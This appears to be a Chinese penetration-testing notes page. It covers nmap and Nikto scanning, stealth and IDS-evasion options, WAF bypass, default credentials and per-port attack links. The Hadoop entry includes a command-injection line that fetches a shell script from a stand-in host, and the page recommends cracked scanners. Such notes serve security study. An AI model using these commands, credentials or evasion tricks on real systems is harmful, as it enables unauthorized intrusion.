+<h3 id="1-主动扫描"><a href="#1-主动扫描" class="headerlink" title="1. 主动扫描"></a>1. 主动扫描</h3><h4 id="1-1-常见服务漏洞（-x3D-x3D-nmap-x3D-x3D-）"><a href="#1-1-常见服务漏洞（-x3D-x3D-nmap-x3D-x3D-）" class="headerlink" title="1.1 常见服务漏洞（&#x3D;&#x3D;nmap&#x3D;&#x3D;）"></a>1.1 常见服务漏洞（&#x3D;&#x3D;nmap&#x3D;&#x3D;）</h4><p><strong>nmap</strong></p>
+<p>功能包括脚本扫描，隐蔽扫描，端口扫描，服务识别，OS识别，探测WAF。</p>
+<p>nmap脚本主要分为以下几类，在扫描时可根据需要设置</p>
+<p>–script&#x3D;类别，这种方式进行比较笼统的扫描：</p>
+<blockquote>
+<p>auth: 负责处理鉴权证书（绕开鉴权）的脚本<br>broadcast: 在局域网内探查更多服务开启状况，如dhcp&#x2F;dns&#x2F;sqlserver等服务<br>brute: 提供暴力破解方式，针对常见的应用如http&#x2F;snmp等<br>default: 使用-sC或-A选项扫描时候默认的脚本，提供基本脚本扫描能力<br>discovery: 对网络进行更多的信息，如SMB枚举、SNMP查询等<br>dos: 用于进行拒绝服务攻击<br>exploit: 利用已知的漏洞入侵系统<br>external: 利用第三方的数据库或资源，例如进行whois解析<br>fuzzer: 模糊测试的脚本，发送异常的包到目标机，探测出潜在漏洞<br>intrusive: 入侵性的脚本，此类脚本可能引发对方的IDS&#x2F;IPS的记录或屏蔽<br>malware: 探测目标机是否感染了病毒、开启了后门等信息<br>safe: 此类与intrusive相反，属于安全性脚本<br>version: 负责增强服务与版本扫描（Version Detection）功能的脚本<br>vuln: 负责检查目标机是否有常见的漏洞（Vulnerability），如是否有MS08_067</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">nmap --script=auth 192.168.137.*</span><br><span class="line">负责处理鉴权证书（绕开鉴权）的脚本,也可以作为检测部分应用弱口令</span><br><span class="line"></span><br><span class="line">nmap -n -p445 --script=broadcast 192.168.137.4</span><br><span class="line">在局域网内探查更多服务开启状况</span><br><span class="line"></span><br><span class="line">nmap --script=brute 192.168.137.*</span><br><span class="line">提供暴力破解的方式 可对数据库，smb，snmp等进行简单密码的暴力猜解</span><br><span class="line"></span><br><span class="line">nmap --script=default 192.168.137.* 或者 nmap -sC 192.168.137.*</span><br><span class="line">默认的脚本扫描，主要是搜集各种应用服务的信息，收集到后，可再针对具体服务进行攻击</span><br><span class="line"></span><br><span class="line">nmap --script=vuln 192.168.137.*</span><br><span class="line">检查是否存在常见漏洞</span><br><span class="line"></span><br><span class="line">nmap --script external 202.103.243.110</span><br><span class="line">利用第三方的数据库或资源，例如进行whois解析</span><br><span class="line"></span><br><span class="line">nmap --script banner ip</span><br><span class="line">nmap -p port -sV ip</span><br><span class="line">获取软件版本信息</span><br><span class="line"></span><br><span class="line">nmap -O ip</span><br><span class="line">操作系统信息，版本</span><br><span class="line"></span><br><span class="line">nmap -A -v -sS -T2 ip</span><br><span class="line">完整信息获取,详细显示，syn探测，高速扫描，系统和服务版本信息，脚本扫描和路由跟踪,外网扫描T2比较合适，T4以上不准确</span><br><span class="line"></span><br><span class="line">扫描前1000号TCP端口</span><br><span class="line">nmap 192.168.100.2</span><br><span class="line"></span><br><span class="line">Ping扫描8个本地主机(按ARP、ICMP、TCP 80的顺序)</span><br><span class="line">nmap –sP 192.168.100.0 -7</span><br><span class="line"></span><br><span class="line">扫描80,443端口</span><br><span class="line">nmap -p 80,443 192.168.100.2</span><br><span class="line"></span><br><span class="line">扫描前1000号TCP端口，OS指纹，服务，然后运行一个NSE脚本</span><br><span class="line">sudo nmap -A 192.168.100.2</span><br><span class="line"></span><br><span class="line">扫描全部65535个TCP端口，OS指纹，服务，然后运行一个NSE脚本</span><br><span class="line">sudo nmap –A –p- 192.168.100.2</span><br><span class="line"></span><br><span class="line">扫描前1000号UDP端口</span><br><span class="line">sudo nmap -sU 192.168.100.2</span><br><span class="line"></span><br><span class="line">扫描所有65535个UDP端口</span><br><span class="line">sudo nmap -sU –p- 192.168.100.2</span><br><span class="line"></span><br><span class="line">扫描所有65535个UDP端口，并获取服务、OS指纹，之后运行一些NSE脚本</span><br><span class="line">sudo nmap –sU -p- -A 192.168.100.2</span><br></pre></td></tr></table></figure>
+
+<p><strong>隐蔽扫描</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nmap -sN 10.10.10.129</span><br><span class="line">nmap -sN 10.10.10.129</span><br><span class="line">nmap -sF 10.10.10.129</span><br></pre></td></tr></table></figure>
+
+<p>&#x3D;&#x3D;<strong>-sN</strong>&#x3D;&#x3D; 是Null扫描，是通过发送非常规的TCP通信数据包进行探测。<strong>Null扫描不会标记任何数据包，目标主机相应端口关闭，会响应一个RST数据包，端口开启则不会响应任何信息；</strong></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220814164843843.png" alt="image-20220814164843843"></p>
+<p>21端口开启，所以-sN扫描未返回任何数据包：</p>
+<p>发送的数据包：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220814165335013.png" alt="image-20220814165335013"></p>
+<p>&#x3D;&#x3D;<strong>-sF</strong>&#x3D;&#x3D; 是FIN扫描，当我们使用TCP SYN扫描时可能会被目标主机的防火墙发现，会阻止SYN数据包，这时我们使用TCP FIN扫描方式会有很好的穿透效果。使用FIN扫描不需要完成TCP握手，TCP FIN扫描是<strong>向目标端口发送一个FIN包，收到响应RST包则说明目标端口是开放的，如果没有收到RST则说明是关闭的。</strong></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220814165013556.png" alt="image-20220814165013556"></p>
+<p>发送的FIN数据包：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220814165444175.png" alt="image-20220814165444175"></p>
+<p>邮件服务端口110开启，所以返回RST数据包：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220814165151837.png" alt="image-20220814165151837"></p>
+<p>&#x3D;&#x3D;<strong>-sX</strong>&#x3D;&#x3D; 是Xmas扫描，发送的数据包的FIN、PSH和URG标记位置打开，即标志为1。如果目标主机的FIN、PSH和URG标记位是开放的，则会响应一个RST标志包；</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220814165213503.png" alt="image-20220814165213503"></p>
+<p>发送的数据包，FIN、PSH和URG标记位为1：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220814165601023.png" alt="image-20220814165601023"></p>
+<p>目标主机的FIN、PSH和URG标记位是开放的。所以返回RST数据包，并且可以发现目标主机的FIN、PSH和URG标记位为0：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220814164728548.png" alt="image-20220814164728548"></p>
+<h4 id="1-2-常见端口漏洞利用"><a href="#1-2-常见端口漏洞利用" class="headerlink" title="1.2 常见端口漏洞利用"></a>1.2 常见端口漏洞利用</h4><p>快速扫描：<br>Masscan -p80,800 ip –rate&#x3D;10000</p>
+<p><strong>21 &#x2F; FTP</strong></p>
+<blockquote>
+<p>匿名&#x2F;暴力破解<br>拒绝服务</p>
+</blockquote>
+<p><strong>22 &#x2F; SSH</strong></p>
+<blockquote>
+<p>暴力破解</p>
+</blockquote>
+<p><strong>23 &#x2F; telnet</strong></p>
+<blockquote>
+<p>Winbox(CVE-2018-14847)<br><a target="_blank" rel="noopener" href="https://github.com/BasuCert/WinboxPoC">https://github.com/BasuCert/WinboxPoC</a><br>弱口令 &#x2F; 暴力破解</p>
+</blockquote>
+<p><strong>161 &#x2F; snmp</strong></p>
+<blockquote>
+<p>弱口令<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/archersaber39/article/details/78932252">https://blog.csdn.net/archersaber39/article/details/78932252</a></p>
+</blockquote>
+<p><strong>389 &#x2F; ladp</strong></p>
+<blockquote>
+<p>匿名访问<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/persuit/p/5706432.html">https://www.cnblogs.com/persuit/p/5706432.html</a><br>ladp注入<br><a target="_blank" rel="noopener" href="http://www.4hou.com/technology/9090.html">http://www.4hou.com/technology/9090.html</a><br><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/149059.html">https://www.freebuf.com/articles/web/149059.html</a></p>
+</blockquote>
+<p><strong>443 &#x2F; ssl</strong></p>
+<blockquote>
+<p>openssl心脏出血<br><a target="_blank" rel="noopener" href="https://paper.seebug.org/437/">https://paper.seebug.org/437/</a><br><a target="_blank" rel="noopener" href="http://www.anquan.us/static/drops/papers-1381.html">http://www.anquan.us/static/drops/papers-1381.html</a><br><a target="_blank" rel="noopener" href="https://www.freebuf.com/sectool/33191.html">https://www.freebuf.com/sectool/33191.html</a></p>
+</blockquote>
+<p><strong>445 &#x2F; smb</strong></p>
+<blockquote>
+<p>win10拒绝服务<br>永恒之蓝RCE</p>
+</blockquote>
+<p><strong>875 &#x2F; rsync</strong></p>
+<blockquote>
+<p>匿名访问<br><a target="_blank" rel="noopener" href="http://www.anquan.us/static/bugs/wooyun-2016-0190815.html">http://www.anquan.us/static/bugs/wooyun-2016-0190815.html</a><br><a target="_blank" rel="noopener" href="https://paper.seebug.org/409/">https://paper.seebug.org/409/</a><br><a target="_blank" rel="noopener" href="http://www.91ri.org/11093.html">http://www.91ri.org/11093.html</a></p>
+</blockquote>
+<p><strong>1433 &#x2F; mssql</strong></p>
+<blockquote>
+<p>暴力破解<br><a target="_blank" rel="noopener" href="http://www.anquan.us/static/drops/tips-12749">http://www.anquan.us/static/drops/tips-12749</a>.　　html<br><a target="_blank" rel="noopener" href="https://www.seebug.org/appdir/Microsoft%20SQL%20Server">https://www.seebug.org/appdir/Microsoft%20SQL%20Server</a></p>
+<p><strong>1521 &#x2F; oracle</strong></p>
+</blockquote>
+<blockquote>
+<p>暴力破解<br><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/33084">https://www.exploit-db.com/exploits/33084</a></p>
+</blockquote>
+<p><strong>2601 &#x2F; zebra</strong></p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://www.anquan.us/static/bugs/wooyun-2013-047409.html">http://www.anquan.us/static/bugs/wooyun-2013-047409.html</a></p>
+</blockquote>
+<p><strong>3128 &#x2F; squid</strong></p>
+<p><strong>3306 &#x2F; mysql</strong></p>
+<blockquote>
+<p>RCE<br><a target="_blank" rel="noopener" href="http://www.91ri.org/17511.html">http://www.91ri.org/17511.html</a><br>CVE-2015-0411<br>hash破解<br><a target="_blank" rel="noopener" href="https://www.freebuf.com/column/153561.html">https://www.freebuf.com/column/153561.html</a><br>waf绕过<br><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/155570.html">https://www.freebuf.com/articles/web/155570.html</a><br>general_log_file getshell<br><a target="_blank" rel="noopener" href="https://www.freebuf.com/column/143125.html">https://www.freebuf.com/column/143125.html</a><br>提权<br><a target="_blank" rel="noopener" href="http://www.91ri.org/16540.html">http://www.91ri.org/16540.html</a></p>
+</blockquote>
+<p><strong>3312 &#x2F; kangle</strong></p>
+<blockquote>
+<p>getshell<br><a target="_blank" rel="noopener" href="https://www.secpulse.com/archives/23927.html">https://www.secpulse.com/archives/23927.html</a></p>
+</blockquote>
+<p><strong>3389 &#x2F; rdp</strong></p>
+<blockquote>
+<p>shift 放大镜 输入法绕过 guest用户<br>永恒之蓝(ESTEEMAUDIT)<br><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/132171.html">https://www.freebuf.com/articles/system/132171.html</a><br><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/86328">https://www.anquanke.com/post/id/86328</a><br>ms12-020<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/meyo_leo/article/details/77950552">https://blog.csdn.net/meyo_leo/article/details/77950552</a></p>
+</blockquote>
+<p><strong>4440 &#x2F; rundeck</strong></p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.secpulse.com/archives/29500.html">https://www.secpulse.com/archives/29500.html</a></p>
+</blockquote>
+<p><strong>4848 &#x2F; glassfish</strong></p>
+<blockquote>
+<p>文件读取<br><a target="_blank" rel="noopener" href="https://www.secpulse.com/archives/42277.html">https://www.secpulse.com/archives/42277.html</a><br><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/85948">https://www.anquanke.com/post/id/85948</a><br>GlassFish2 &#x2F; admin:admin GlassFish3,4 &#x2F; 如果管理员不设置帐号本地会自动登录,远程访问会提示配置错误</p>
+</blockquote>
+<p><strong>5432 &#x2F; PostgreSQL</strong></p>
+<blockquote>
+<p>RCE<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/KevinGeorge/p/8521496.html">https://www.cnblogs.com/KevinGeorge/p/8521496.html</a><br><a target="_blank" rel="noopener" href="https://www.secpulse.com/archives/69153.html">https://www.secpulse.com/archives/69153.html</a><br>默认账号postgres<br>参考<br><a target="_blank" rel="noopener" href="http://www.91ri.org/13070.html">http://www.91ri.org/13070.html</a><br><a target="_blank" rel="noopener" href="http://www.91ri.org/6507.html">http://www.91ri.org/6507.html</a></p>
+</blockquote>
+<p><strong>5672,15672,4369,25672 &#x2F; RabbitMQ</strong><br>（guest&#x2F;guest）</p>
+<p><strong>5900 &#x2F; VNC</strong></p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.seebug.org/appdir/RealVNC">https://www.seebug.org/appdir/RealVNC</a></p>
+</blockquote>
+<p><strong>5984 &#x2F; CouchDB</strong></p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://xxx:5984/_utils/">http://xxx:5984/_utils/</a></p>
+</blockquote>
+<p><strong>6082 &#x2F; varnish</strong></p>
+<blockquote>
+<p>CLI 未授权<br><a target="_blank" rel="noopener" href="https://www.secpulse.com/archives/10681.html">https://www.secpulse.com/archives/10681.html</a></p>
+</blockquote>
+<p><strong>6379 &#x2F; redis</strong></p>
+<blockquote>
+<p>Redis未授权<br>ssh publickey<br>crontab<br>webshell<br>反序列化<br>开机自启文件夹写bat<br>参考<br><a target="_blank" rel="noopener" href="https://www.freebuf.com/column/170710.html">https://www.freebuf.com/column/170710.html</a></p>
+</blockquote>
+<p><strong>7001,7002 &#x2F; WebLogic</strong></p>
+<blockquote>
+<p>默认弱口令<br>weblogic&#x2F;weblogic ,weblogic&#x2F;welcom ,weblogic&#x2F;welcom1,weblogic1&#x2F;weblogic<br>反序列<br>CVE-2018-2628<br><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/169770.html">https://www.freebuf.com/articles/web/169770.html</a><br><a target="_blank" rel="noopener" href="https://www.seebug.org/appdir/WebLogic">https://www.seebug.org/appdir/WebLogic</a></p>
+</blockquote>
+<p><strong>9200,9300 &#x2F; elasticsearch</strong></p>
+<blockquote>
+<p>CVE-2015-1427<br><a target="_blank" rel="noopener" href="http://www.anquan.us/static/drops/papers-5142.html">http://www.anquan.us/static/drops/papers-5142.html</a><br>CVE-2018-17246<br><a target="_blank" rel="noopener" href="https://www.seebug.org/vuldb/ssvid-97730">https://www.seebug.org/vuldb/ssvid-97730</a><br>参考<br><a target="_blank" rel="noopener" href="https://www.seebug.org/search/?keywords=elasticsearch">https://www.seebug.org/search/?keywords=elasticsearch</a></p>
+</blockquote>
+<p><strong>9000 &#x2F; fcgi</strong></p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/289/">https://paper.seebug.org/289/</a></p>
+</blockquote>
+<p><strong>9043 &#x2F; WebSphere</strong></p>
+<blockquote>
+<p>Websphere8.5<br><a target="_blank" rel="noopener" href="https://localhost:9043/ibm/console/logon.jsp">https://localhost:9043/ibm/console/logon.jsp</a><br>Websphere6-7<br><a target="_blank" rel="noopener" href="http://localhost:9043/ibm/console">http://localhost:9043/ibm/console</a><br>后台未授权，登录后可部署WAR包<br>SOAP服务有反序列化<br>弱口令：admin &#x2F; password</p>
+</blockquote>
+<p><strong>11211 &#x2F; memcache</strong></p>
+<blockquote>
+<p>未授权<br>UDP反射<br><a target="_blank" rel="noopener" href="https://shockerli.net/post/memcached-udp-reflection-attack-bug/">https://shockerli.net/post/memcached-udp-reflection-attack-bug/</a></p>
+</blockquote>
+<p><strong>27017,27018 &#x2F; Mongodb</strong></p>
+<blockquote>
+<p>未授权<br>注入<br><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/83763">https://www.anquanke.com/post/id/83763</a><br>phpMoAdmin RCE<br><a target="_blank" rel="noopener" href="https://www.aqniu.com/threat-alert/6978.html">https://www.aqniu.com/threat-alert/6978.html</a></p>
+</blockquote>
+<p><strong>50000 &#x2F; SAP</strong></p>
+<blockquote>
+<p>SAP命令执行<br><a target="_blank" rel="noopener" href="https://www.secpulse.com/archives/20204.html">https://www.secpulse.com/archives/20204.html</a></p>
+</blockquote>
+<p><strong>50070,50030 &#x2F; hadoop</strong></p>
+<blockquote>
+<p>未授权<br><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/173638.html">https://www.freebuf.com/vuls/173638.html</a><br>命令执行<br>host:50060&#x2F;pstack?pid&#x3D;123|wget <a target="_blank" rel="noopener" href="http://somehost/shell.sh">http://somehost/shell.sh</a><br><a target="_blank" rel="noopener" href="https://www.seebug.org/search/?keywords=hadoop">https://www.seebug.org/search/?keywords=hadoop</a><br>其他<br><a target="_blank" rel="noopener" href="http://www.91ri.org/15441.html">http://www.91ri.org/15441.html</a></p>
+</blockquote>
+<h4 id="1-3-WAF-及-bypass"><a href="#1-3-WAF-及-bypass" class="headerlink" title="1.3 WAF 及 bypass"></a>1.3 WAF 及 bypass</h4><p>探测WAF。</p>
+<p><strong>Nmap</strong>探测WAF有两种脚本，一种是<code>http-waf-detect</code>，一种是<code>http-waf-fingerprint</code>。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -p port --script=http-waf-detect ip</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><strong>wafw00f</strong>：kaili中的防火墙探测工具</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wafw00f -a http://example.com 　　</span><br></pre></td></tr></table></figure>
+
+<p><strong>sqlmap</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap-u “http://www.vxxxx.org/ex.php?id=1” --identify-waf</span><br></pre></td></tr></table></figure>
+
+<p>bypass：</p>
+<p>（1）请求真实ip绕过waf：部分watf部署架构的特性，部分waf并不是直接串在目标站点线路上，而是通过DNS解析的形式部署，此时可以先探测到目标站点的真实ip直接请求ip以此绕过waf的检测；</p>
+<p>（2）检测内容范围绕过：waf性能限制，检测特定内容前几k或几十K的内容，然后在此特定内容段内填充物用数据， payload放于物用数据后，以此绕过检测；</p>
+<p>（3）协议盲区绕过：waf根据自己的防御策略所支持的协议特性，针对该协议内的请求进行检查，但是存在一些协议检测或协议运行机制上的缺陷导致被绕过，例如协议未覆盖、协议解析不正确、协议解析遗漏等；</p>
+<p>（4）检测规则绕过：waf工程师规则编写经验、规则覆盖面等问题，来绕过检测，例如利用 MySQL对一些特殊字符处理的特性、语法特性绕过。</p>
+<p>（5）文件包含绕过：相对路径、绝对路径。</p>
+<p>绕过技术：</p>
+<ol>
+<li><p>大小写转换</p>
+</li>
+<li><p>URL编码</p>
+</li>
+<li><p>Unicode</p>
+</li>
+<li><p>HTML编码</p>
+</li>
+<li><p>混合编码</p>
+</li>
+<li><p>使用注释</p>
+</li>
+<li><p>双重编码</p>
+</li>
+<li><p>通配符混淆</p>
+</li>
+<li><p>垃圾字符</p>
+</li>
+<li><p>换行</p>
+</li>
+<li><p>未初始化的变量</p>
+</li>
+<li><p>制表符和换行</p>
+</li>
+<li><p>令牌破坏者</p>
+</li>
+<li><p>其他格式的混淆</p>
+</li>
+</ol>
+<h4 id="1-4-目录、后台和敏感路径文件扫描"><a href="#1-4-目录、后台和敏感路径文件扫描" class="headerlink" title="1.4 目录、后台和敏感路径文件扫描"></a>1.4 目录、后台和敏感路径文件扫描</h4><p><strong>御剑</strong> 目录（土司专版，笔记里有）、后台扫描（图片属性地址暴露），</p>
+<p><strong>完善目录和账密字典方法：</strong></p>
+<p>基础字典包合并去重</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dymerge.py -u</span><br><span class="line">python pydictor.py -tool uniqbiner /my/dict/dirpath --output uniq.txt</span><br><span class="line">python pydictor.py -tool uniqifer /tmp/dicts.txt --output /tmp/uniq.txt</span><br></pre></td></tr></table></figure>
+
+<p>推荐工具：<strong>白鹿社工字典</strong></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/HongLuDianXue/BaiLu-SED-Tool/releases">https://github.com/HongLuDianXue/BaiLu-SED-Tool/releases</a></p>
+<p>密码字典实时丰富更新。提取各种泄露数据中的各种类型的密码，然后按出现频率排序，比如键盘组合top100等等，就能得到各种类型的密码字典。</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/huyuanzhi2/password_brute_dictionary">https://github.com/huyuanzhi2/password_brute_dictionary</a></p>
+<h3 id="2-人工浏览-逐个请求burp"><a href="#2-人工浏览-逐个请求burp" class="headerlink" title="2. 人工浏览\逐个请求burp"></a>2. 人工浏览\逐个请求burp</h3><p>非常重要,有必要手动去浏览每个页面，点击页面上每一个跳转，这样在Burp的sitemap里面就可以出现这些请求和响应。</p>
+<p>图片后台地址\图片后面的信息<br>跳转参数\奇怪的参数<br>泄露邮箱等社工信息<br>业务逻辑\架构</p>
+<h3 id="3-自动化"><a href="#3-自动化" class="headerlink" title="3.自动化"></a>3.自动化</h3><p>自动化渗透测试框架:(待补充)</p>
+<p>Sn1per</p>
+<p>Ary</p>
+<p>railgun</p>
+<p>自动化信息收集效率较高，从github上多找一找，也可以自己写：</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/shmilylty/OneForAll">https://github.com/shmilylty/OneForAll</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 oneforall.py --target example.com run</span><br><span class="line">python3 oneforall.py --targets ./example.txt run</span><br></pre></td></tr></table></figure>
+
+<h2 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h2><h3 id="1-漏洞扫描工具"><a href="#1-漏洞扫描工具" class="headerlink" title="1. 漏洞扫描工具"></a>1. 漏洞扫描工具</h3><p>注意：登录类网站扫描要带cookies扫才能扫到</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">AWVS网上总有最新破解版</span><br><span class="line"></span><br><span class="line">goby自动化漏扫框架，功能丰富，必备</span><br><span class="line"></span><br><span class="line">Nessus破解流程复杂，但是真的好用</span><br><span class="line"></span><br><span class="line">Netsparker综合型的web应用安全漏洞扫描工具，检查SQL和XSS比较擅长</span><br><span class="line"></span><br><span class="line">Xray也是必备的，渗透开始就挂着，鼠标点到哪里扫到哪里，联动burp和其他漏扫效果也不错</span><br></pre></td></tr></table></figure>
+
+<h4 id="1-1-Nikto-Web服务漏洞扫描器"><a href="#1-1-Nikto-Web服务漏洞扫描器" class="headerlink" title="1.1 Nikto Web服务漏洞扫描器"></a>1.1 Nikto Web服务漏洞扫描器</h4><p>Tips：利用-Format选项来导出特定格式的扫描结果，使扫描结果更容易阅读和分析。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nikto -host http://example.com -output ~/nikto.html -Format html</span><br></pre></td></tr></table></figure>
+
+<p>NIKTO使用方法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">1、Nikto -update #升级，更新插件；</span><br><span class="line">2、Nikto -list-plugins #查看插件；</span><br><span class="line">3、Nikto -host http://1.1.1.1 #扫描目标：域名方式；</span><br><span class="line">4、Nikto -host http://1.1.1.1 -output #扫描并输出结果</span><br><span class="line">5、Nikto -host 1.1.1.1 -port 80 #扫描目标：ip地址加端口号</span><br><span class="line">6、Nikto -host http://www.baidu.com -port 443 -ssl #扫描https网站</span><br><span class="line">7、Nikto -host 文件名.txt #批量扫描目标</span><br><span class="line">8、nmap -p80 192.168.1.0/24 -oG - | nikto -host -</span><br><span class="line">#利用nmap扫描开放80端口的IP段并且oG（nmap结果输出并整理）通过管道的方式“|”用nikto进行扫描</span><br><span class="line">9、nikto -host 192.168.0.1 -useproxy http://localhost:8070</span><br><span class="line">#利用代理进行扫描</span><br><span class="line">10、-vhost</span><br><span class="line">#当一个网站存在多个端口时可以使用-vhost 遍历所有网站进行扫描或一个ip对应多个网站</span><br><span class="line">11、Nikto交互形参数</span><br></pre></td></tr></table></figure>
+
+<p><strong>配置文件</strong>：</p>
+<p>路径：&#x2F;etc&#x2F;nikto.conf<br>User Agent中文名为用户代理，简称 UA，它是一个特殊字符串头，使得服务器能够识别客户使用的操作系统及版本；<br>在nikto中最好修改成别的浏览器user agent；<br>设置cookie：<br>在配置文件中找到cookie进行设置（#STATIC-COOKIE&#x3D; “cookie1”&#x3D;”cookie value”;”cookie2”&#x3D;”cookie val”）</p>
+<p><strong>IDS逃避技术</strong>：</p>
+<p>主要为了躲避IDS、IPS检测告警-evasion #此参数使用方式（Nikto -host <a target="_blank" rel="noopener" href="http://1.1.1.1/">http://1.1.1.1</a> -evasion 1234）<br>逃避方式共8种：<br>1、随机url编码，2、自选路径，3、过早结束的URL<br>4、优先考虑长随机字符串5、参数欺骗<br>6、使用TAB作为命令的分隔符，7、使用变化的URL<br>8、使用Windows路径分隔符</p>
+<h4 id="1-2-AWVS漏扫"><a href="#1-2-AWVS漏扫" class="headerlink" title="1.2 AWVS漏扫"></a>1.2 AWVS漏扫</h4><p>这个没什么好说的，破解版到处都是。</p>
